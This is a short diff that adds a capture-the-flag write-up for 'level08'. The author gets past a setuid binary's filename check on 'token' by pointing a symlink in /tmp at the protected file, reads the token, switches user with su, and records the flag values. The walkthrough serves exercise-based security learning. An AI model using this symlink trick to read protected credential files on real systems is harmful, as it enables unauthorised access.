@@ -1,0 +1,22 @@
+$> strings level08
+
+We can see that this binary use open and read function.
+This binary displays the content of a file.
+
+$> touch test /tmp/test ; echo test > /tmp/test
+$> ./level08 /tmp/test
+test
+
+If we try to read content of token file, acces is denied.
+$> ./level08 token
+You may not access 'token'
+
+We cans see with the strings command that ./level08 is using strstr to compare the word token and argv[1]. So if we change the name of token by an other the binary will open it.
+changing the name directly is impossible but we can create a symlink
+
+$> ln -s ~/token /tmp/getflag
+$> ./level08 /tmp/getflag
+quif5eloekouj29ke0vouxean
+$> su flag08
+$> getflag
+Check flag.Here is your token : 25749xKZ8L7DkSCwJkT9dyv6f
